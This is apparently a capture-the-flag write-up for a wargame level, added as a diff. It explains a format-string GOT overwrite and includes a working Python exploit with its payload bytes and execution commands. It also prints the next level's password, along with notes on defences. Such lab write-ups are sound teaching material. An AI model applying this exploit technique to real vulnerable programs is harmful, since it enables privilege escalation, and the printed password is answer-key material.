@@ -1,0 +1,209 @@
+# Level5 Walkthrough - GOT Overwrite Exploitation
+
+## Quick Summary
+Level5 exploits a format string vulnerability to perform a GOT (Global Offset Table) overwrite, redirecting the exit() function to an unreachable function o() that contains a system() call, ultimately providing shell access.
+
+## Step-by-Step Process
+
+### 1. Initial Analysis
+```bash
+# Check file properties
+file level5
+ls -la level5
+
+# Test basic behavior
+echo "test" | ./level5
+# Output: test (echoes input - indicates format string vulnerability)
+
+# Test format string
+echo "AAAA%x%x%x" | ./level5  
+# Shows format string vulnerability exists
+```
+
+### 2. Binary Analysis with GDB
+```bash
+gdb level5
+(gdb) info functions
+# Found: main, n, o functions
+
+(gdb) disas main
+# Shows main() calls n()
+
+(gdb) disas n
+# Shows: fgets() -> printf(buffer) -> exit(1)
+# Vulnerable printf() call, then immediate exit
+
+(gdb) disas o  
+# Shows: system() call! But function is never called normally
+# This is our target function
+
+(gdb) print o
+# Result: 0x80484a4 <o>  (target function address)
+```
+
+### 3. Identify GOT Address
+```bash
+# Find exit() GOT entry address
+readelf -r level5 | grep exit
+# Result: 08049838  00000607 R_386_JUMP_SLOT   00000000   exit
+
+# The GOT address for exit() is 0x08049838
+```
+
+### 4. Stack Position Discovery
+```bash
+echo "AAAA%1\$x.%2\$x.%3\$x.%4\$x.%5\$x.%6\$x.%7\$x.%8\$x.%9\$x.%10\$x" | ./level5
+# Look for 41414141 (AAAA in hex)
+# Result: Found at position 4
+```
+
+### 5. Understanding the Attack Strategy
+**Key Insight**: Use GOT overwrite to hijack exit() function
+
+- **Normal flow**: main() → n() → printf() → exit(1) → [terminate]
+- **Attack flow**: main() → n() → printf() → exit(1) → o() → system()
+
+**Method**: 
+1. Use format string %n to write to arbitrary memory
+2. Overwrite exit() GOT entry (0x08049838) 
+3. Write address of function o() (0x080484a4)
+4. When exit(1) is called, it jumps to o() instead
+
+### 6. Exploit Development
+```python
+#!/usr/bin/env python2
+import struct
+
+# Addresses from analysis
+o_function = 0x080484a4      # Target function with system()
+exit_got = 0x08049838        # exit() GOT entry address  
+STACK_POSITION = 4           # Where our input appears on stack
+
+# Create payload
+payload = struct.pack('<L', exit_got)    # Target address (4 bytes)
+remaining = o_function - 4               # Characters needed: 134513824
+payload += "%" + str(remaining) + "c"    # Width specifier for efficiency
+payload += "%" + str(STACK_POSITION) + "$n"  # Write count to position 4
+
+print payload
+```
+
+### 7. Exploit Mechanics Explained
+**Payload breakdown**: `\x38\x98\x04\x08%134513824c%4$n`
+
+1. **`\x38\x98\x04\x08`**: Address 0x08049838 (exit GOT entry) in little-endian
+2. **`%134513824c`**: Print 134,513,824 characters (width specifier)
+3. **`%4$n`**: Write total character count to address at stack position 4
+
+**Character count calculation**:
+- 4 bytes (address) + 134,513,824 (padding) = 134,513,828 total
+- 134,513,828 = 0x080484a4 (address of function o()!)
+
+**Memory write**:
+- %4$n writes 134,513,828 to address 0x08049838
+- Result: exit@got[0x08049838] = 0x080484a4
+- Now exit() points to function o()!
+
+### 8. Execution and Success
+```bash
+# Run the exploit
+(python exploit.py; cat) | ./level5
+
+# Get shell access
+whoami
+# Output: level6
+
+# Get the flag
+cat /home/user/level6/.pass
+# Output: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+# Verify privileges
+id
+# Output: uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users)
+```
+
+## Key Techniques Used
+
+### 1. **GOT Overwrite Attack**
+- **Target**: Global Offset Table entry for exit() function
+- **Method**: Use format string %n to write arbitrary values to arbitrary addresses
+- **Impact**: Redirect function calls to attacker-controlled code
+
+### 2. **Format String %n Exploitation**
+- **Mechanism**: %n writes character count to specified memory address
+- **Precision**: Exact value control through character count manipulation
+- **Efficiency**: Width specifiers for large value generation
+
+### 3. **Width Specifier Technique**
+- **Challenge**: Need to write large value (134,513,828)
+- **Solution**: %134513824c prints single character padded to massive width
+- **Advantage**: Avoids generating millions of actual characters
+
+### 4. **Stack Position Analysis**
+- **Method**: Systematic testing with known patterns (AAAA = 0x41414141)
+- **Result**: Input buffer appears at stack position 4
+- **Usage**: %4$n targets our placed address for writing
+
+### 5. **ELF Binary Analysis**
+- **Dynamic Linking**: Understanding GOT/PLT mechanisms
+- **Memory Layout**: Identifying writable GOT section
+- **Address Calculation**: Converting between decimal counts and hex addresses
+
+## Critical Insights
+
+### Why GOT Overwrite Works
+1. **GOT is writable**: Unlike PLT, GOT entries can be modified at runtime
+2. **Predictable addresses**: GOT entries have static, known addresses
+3. **Function indirection**: All external function calls go through GOT
+4. **Natural execution**: Program calls exit() for us - no need to hijack control flow
+
+### Format String Power
+- **Arbitrary read/write**: %s for reading, %n for writing arbitrary memory
+- **Position control**: %N$ syntax for targeting specific stack positions  
+- **Value precision**: Character count manipulation for exact value writes
+- **Efficiency**: Width specifiers enable practical large value attacks
+
+### Advanced Exploitation Concepts
+- **Code reuse**: Leveraging existing functions (o) rather than injecting shellcode
+- **Execution flow hijacking**: Redirecting legitimate function calls
+- **Memory layout exploitation**: Understanding and manipulating ELF structures
+
+## Files Created
+- `exploit.py` - Final working GOT overwrite exploit
+- `source.c` - Reconstructed source code
+- `Ressources/analysis.md` - Comprehensive technical analysis
+- `debug_exploit.py` - Development and testing utilities
+
+## Security Lessons
+
+### Vulnerability Root Causes
+1. **Uncontrolled format strings**: printf(user_input) instead of printf("%s", user_input)
+2. **Writable GOT**: No RELRO protection on dynamic linking tables
+3. **Predictable memory layout**: No ASLR on code/data sections
+
+### Modern Protections
+- **FORTIFY_SOURCE**: Runtime format string vulnerability detection
+- **Full RELRO**: Make GOT read-only after dynamic linking
+- **PIE + ASLR**: Randomize code and data addresses
+- **Stack canaries**: Detect stack corruption (though not applicable here)
+
+## Password for Level6
+```
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+## Next Steps
+Use the obtained password to access level6:
+```bash
+su level6
+# Enter password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+## Conclusion
+Level5 demonstrates advanced binary exploitation requiring deep understanding of:
+- ELF binary internals and dynamic linking mechanisms
+- Format string exploitation beyond basic techniques  
+- Memory layout analysis and GOT/PLT structures
+- Execution flow hijacking through function pointer manipulation
+
+This represents a significant step up in complexity, showcasing how sophisticated attackers can turn minor input validation bugs into complete system compromise through creative exploitation of system internals.
